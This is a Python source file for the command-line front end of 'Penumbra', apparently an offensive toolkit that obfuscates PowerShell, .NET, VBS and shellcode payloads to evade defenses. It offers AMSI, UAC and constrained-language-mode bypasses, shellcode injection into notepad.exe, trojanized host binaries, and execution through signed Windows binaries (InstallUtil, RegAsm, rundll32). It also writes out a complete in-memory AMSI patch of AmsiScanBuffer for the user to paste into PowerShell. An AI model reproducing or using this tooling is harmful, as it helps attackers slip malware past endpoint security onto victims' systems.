"""Penumbra CLI — single-command Typer app."""

from __future__ import annotations

import sys
from pathlib import Path
from typing import Annotated

import typer
from rich.console import Console

# Trigger pass registration by importing pipeline sub-packages
import penumbra.dotnet  # noqa: F401
import penumbra.ps  # noqa: F401
import penumbra.script  # noqa: F401
import penumbra.shellcode  # noqa: F401
import penumbra.vbs  # noqa: F401
from penumbra import __version__
from penumbra.detector import detect
from penumbra.pipeline import resolve_passes, run
from penumbra.spinner import write_hint
from penumbra.types import PassConfig, PipelineType

console = Console(stderr=True)

_PIPELINE_MAP: dict[str, PipelineType] = {t.value: t for t in PipelineType}

# ANSI 256-color codes
_M = "\033[38;5;5m"    # magenta — moon
_B = "\033[38;5;245m"  # light gray — border
_T = "\033[38;5;240m"  # dark gray — text
_R = "\033[0m"         # reset

_BANNER = (
    f"{_B}╭────────────────────────╮{_R}\n"
    f"{_B}│  {_M}\uf4ee  {_T}p e n u m b r a{_B}    │{_R}\n"
    f"{_B}╰────────────────────────╯{_R}\n"
)


def _print_banner() -> None:
    """Print the Penumbra banner to stderr."""
    sys.stderr.write(_BANNER)


def _version_callback(value: bool) -> None:
    if value:
        _print_banner()
        console.print(f"  {__version__}")
        raise typer.Exit()


class PenumbraApp(typer.Typer):
    """Typer subclass that prints the banner before any output."""

    def __call__(self, *args: object, **kwargs: object) -> object:
        _print_banner()
        return super().__call__(*args, **kwargs)


app = PenumbraApp(add_completion=False)


def _validate_exclusivity(
    embed: bool,
    ps1_loader: bool,
    lolbas: str | None,
    inject: str | None,
    fmt: str | None,
    clm_bypass: bool,
) -> None:
    """Validate mutual exclusivity of feature flags."""
    # --embed, --ps1-loader, --lolbas are mutually exclusive
    active = sum([embed, ps1_loader, lolbas is not None])
    if active > 1:
        console.print(
            "[red]Error:[/red] --embed, --ps1-loader, and --lolbas are mutually exclusive"
        )
        raise typer.Exit(1)

    # --inject and --format are mutually exclusive
    if inject is not None and fmt is not None:
        console.print("[red]Error:[/red] --inject and --format are mutually exclusive")
        raise typer.Exit(1)

    # --clm-bypass is mutually exclusive with --embed, --ps1-loader, --lolbas
    if clm_bypass and (embed or ps1_loader or lolbas is not None):
        console.print(
            "[red]Error:[/red] --clm-bypass is mutually exclusive with "
            "--embed, --ps1-loader, and --lolbas"
        )
        raise typer.Exit(1)


@app.command()
def main(
    input_file: Annotated[Path, typer.Argument(help="File to obfuscate")],
    output: Annotated[
        Path | None, typer.Option("--output", "-o", help="Output file path")
    ] = None,
    pipeline: Annotated[
        str | None,
        typer.Option(
            "--pipeline",
            help="Pipeline type (ps, dotnet-il, script, pe, shellcode, vbs)",
        ),
    ] = None,
    passes: Annotated[
        str | None,
        typer.Option("--passes", help="Comma-separated pass names"),
    ] = None,
    embed: Annotated[
        bool, typer.Option("--embed", help="Wrap output in an in-memory loader (dotnet-il)")
    ] = False,
    host: Annotated[
        Path | None,
        typer.Option("--host", help="Host binary for trojanized embed (dotnet-il)"),
    ] = None,
    fmt: Annotated[
        str | None,
        typer.Option(
            "--format",
            help="Output format for shellcode (exe, ps1)",
        ),
    ] = None,
    amsi_technique: Annotated[
        str | None,
        typer.Option(
            "--amsi-technique",
            help="AMSI bypass technique: reflection, patch, context (PS1)",
        ),
    ] = None,
    ps1_loader: Annotated[
        bool,
        typer.Option("--ps1-loader", help="Wrap .NET assembly in PS1 reflective loader"),
    ] = False,
    lolbas: Annotated[
        str | None,
        typer.Option(
            "--lolbas",
            help="LOLBAS output format: installutil, rundll32, regasm (dotnet-il)",
        ),
    ] = None,
    uac: Annotated[
        str | None,
        typer.Option(
            "--uac",
            help="UAC bypass: fodhelper, diskcleanup, computerdefaults (PS1)",
        ),
    ] = None,
    clm_bypass: Annotated[
        bool,
        typer.Option("--clm-bypass", help="Wrap PS1 in CLM bypass exe"),
    ] = False,
    inject: Annotated[
        str | None,
        typer.Option(
            "--inject",
            help="Process injection mode for shellcode (default: notepad.exe)",
        ),
    ] = None,
    safe_rename: Annotated[
        bool, typer.Option("--safe-rename", help="Enable safe-rename mode")
    ] = False,
    verbose: Annotated[
        bool, typer.Option("--verbose", "-v", help="Verbose output")
    ] = False,
    version: Annotated[
        bool | None,
        typer.Option("--version", callback=_version_callback, is_eager=True),
    ] = None,
) -> None:
    """Penumbra — Modular obfuscation toolkit."""
    if not input_file.exists():
        console.print(f"[red]Error:[/red] file not found: {input_file}")
        raise typer.Exit(1)

    _validate_exclusivity(embed, ps1_loader, lolbas, inject, fmt, clm_bypass)

    data = input_file.read_bytes()

    # Detect or parse pipeline type
    if pipeline:
        if pipeline not in _PIPELINE_MAP:
            valid = ", ".join(_PIPELINE_MAP)
            console.print(f"[red]Error:[/red] unknown pipeline '{pipeline}'. Valid: {valid}")
            raise typer.Exit(1)
        pipe_type = _PIPELINE_MAP[pipeline]
    else:
        pipe_type = detect(input_file, data)

    # Validate pipeline-specific flags
    if uac and pipe_type != PipelineType.PS1:
        console.print("[red]Error:[/red] --uac is only valid with PS1 pipeline")
        raise typer.Exit(1)

    if clm_bypass and pipe_type != PipelineType.PS1:
        console.print("[red]Error:[/red] --clm-bypass requires PS1 input")
        raise typer.Exit(1)

    if inject is not None and pipe_type != PipelineType.SHELLCODE:
        console.print("[red]Error:[/red] --inject is only valid with shellcode pipeline")
        raise typer.Exit(1)

    # --host implies --embed
    if host and not embed:
        embed = True

    # Build extra config
    extra: dict[str, object] = {}
    if host:
        if not host.exists():
            console.print(f"[red]Error:[/red] host binary not found: {host}")
            raise typer.Exit(1)
        extra["host"] = str(host)
    if fmt:
        extra["format"] = fmt
    if amsi_technique:
        extra["amsi_technique"] = amsi_technique
    if uac:
        extra["uac_method"] = uac
    if inject is not None:
        extra["inject_process"] = inject if inject else "notepad.exe"
    if lolbas:
        extra["lolbas_format"] = lolbas

    config = PassConfig(
        pipeline=pipe_type,
        safe_rename=safe_rename,
        verbose=verbose,
        extra=extra,
    )

    # Determine output path
    if output is None:
        stem = input_file.stem
        if ps1_loader:
            suffix = ".ps1"
        elif clm_bypass:
            suffix = ".exe"
        elif lolbas:
            suffix = ".dll" if lolbas in ("regasm", "rundll32") else ".exe"
        elif pipe_type == PipelineType.SHELLCODE:
            if inject is not None:
                suffix = ".exe"
            else:
                sc_fmt = fmt or "exe"
                suffix = f".{sc_fmt}"
        else:
            suffix = input_file.suffix
        output = input_file.parent / f"{stem}.obf{suffix}"

    # --- Cross-pipeline routing ---

    if ps1_loader and pipe_type == PipelineType.DOTNET_IL:
        # Stage 1: Run dotnet-il default passes on the assembly
        pass_names_list = (
            [p.strip() for p in passes.split(",")] if passes else None
        )
        resolved_il = resolve_passes(PipelineType.DOTNET_IL, pass_names_list)
        obfuscated_asm = run(data, resolved_il, config, silent=True)

        # Stage 2: Generate PS1 loader from obfuscated assembly
        from penumbra.ps.assembly_loader import Ps1AssemblyLoaderPass

        loader_pass = Ps1AssemblyLoaderPass()
        ps1_data = loader_pass.apply(obfuscated_asm, config)

        # Stage 3: Run PS1 passes on the generated script.
        # Skip the amsi pass — the user must run the AMSI bypass manually
        # before executing the script (Defender detects any embedded bypass).
        ps1_config = PassConfig(
            pipeline=PipelineType.PS1,
            safe_rename=safe_rename,
            verbose=verbose,
            extra=extra,
        )
        resolved_ps1 = [
            p for p in resolve_passes(PipelineType.PS1)
            if p.name not in ("amsi", "encode")
        ]
        result = run(ps1_data, resolved_ps1, ps1_config, output_path=str(output))
        output.write_bytes(result)
        # Write AMSI patch bypass to a .txt file alongside the output.
        # The user must paste this in PowerShell before running the script.
        bypass_path = output.with_suffix(".amsi.txt")
        bypass_path.write_text(
            'Add-Type -TypeDefinition @"\n'
            "using System;\n"
            "using System.Runtime.InteropServices;\n"
            "public static class Kernel32 {\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern IntPtr LoadLibrary(string lpLibFileName);\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern IntPtr GetProcAddress("
            "IntPtr hModule, string lpProcName);\n"
            '    [DllImport("kernel32")]\n'
            "    public static extern bool VirtualProtect("
            "IntPtr lpAddress, UIntPtr dwSize, "
            "uint flNewProtect, out uint lpflOldProtect);\n"
            "}\n"
            '"@;\n'
            "$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);\n"
            '$hModule = [Kernel32]::LoadLibrary("amsi.dll");\n'
            "$lpAddress = [Kernel32]::GetProcAddress("
            '$hModule, "Amsi"+"ScanBuffer");\n'
            "$lpflOldProtect = 0;\n"
            "[Kernel32]::VirtualProtect($lpAddress, "
            "[UIntPtr]::new($patch.Length), 0x40, "
            "[ref]$lpflOldProtect) | Out-Null;\n"
            "$marshal = [System.Runtime.InteropServices.Marshal];\n"
            "$marshal::Copy($patch, 0, $lpAddress, $patch.Length);\n"
            "[Kernel32]::VirtualProtect($lpAddress, "
            "[UIntPtr]::new($patch.Length), $lpflOldProtect, "
            "[ref]$lpflOldProtect) | Out-Null;\n"
        )
        write_hint(f"paste {bypass_path.name} in PS first, then: . {output}")
        raise typer.Exit()

    if clm_bypass and pipe_type == PipelineType.PS1:
        # Stage 1: Run PS1 passes on the script
        pass_names_list = (
            [p.strip() for p in passes.split(",")] if passes else None
        )
        resolved_ps1 = resolve_passes(PipelineType.PS1, pass_names_list)
        obfuscated_ps1 = run(data, resolved_ps1, config, silent=True)

        # Stage 2: Wrap in CLM bypass exe
        from penumbra.dotnet.clm_bypass import ClmBypassPass

        clm_pass = ClmBypassPass()
        result = run(obfuscated_ps1, [clm_pass], config, output_path=str(output))
        output.write_bytes(result)
        raise typer.Exit()

    # --- Standard single-pipeline flow ---

    # Resolve passes
    pass_names_list = [p.strip() for p in passes.split(",")] if passes else None
    if embed and pass_names_list and "embed" not in pass_names_list:
        pass_names_list.append("embed")

    opt_in: list[str] | None = None
    if embed and not pass_names_list:
        opt_in = ["embed"]
    if lolbas and not pass_names_list:
        opt_in = opt_in or []
        opt_in.append(lolbas_pass_name(lolbas))
    if uac and not pass_names_list:
        opt_in = opt_in or []
        opt_in.append("uac")
    if inject is not None and not pass_names_list:
        opt_in = opt_in or []
        opt_in.append("inject")

    resolved = resolve_passes(pipe_type, pass_names_list, include_opt_in=opt_in)

    # --inject replaces loader (inject expects encrypted shellcode, not a compiled exe)
    if inject is not None and not pass_names_list:
        resolved = [p for p in resolved if p.name != "loader"]
    result = run(data, resolved, config, output_path=str(output))
    output.write_bytes(result)

    # Print execution hints
    _print_hint(output, embed, ps1_loader, lolbas, uac, clm_bypass, inject)


def lolbas_pass_name(fmt: str) -> str:
    """Map LOLBAS format to pass name."""
    return f"lolbas-{fmt}"


def _print_hint(
    output: Path,
    embed: bool,
    ps1_loader: bool,
    lolbas: str | None,
    uac: str | None,
    clm_bypass: bool,
    inject: str | None,
) -> None:
    """Print execution hint based on feature flags."""
    if lolbas == "installutil":
        write_hint(
            r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe "
            f"/logfile= /LogToConsole=false /U {output}"
        )
    elif lolbas == "regasm":
        write_hint(
            r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe "
            f"/U {output}"
        )
    elif lolbas == "rundll32":
        write_hint(rf"C:\Windows\System32\rundll32.exe {output},DllMain")
    elif uac:
        write_hint(f"powershell -ep bypass -File {output}")
    pass


if __name__ == "__main__":
    app()
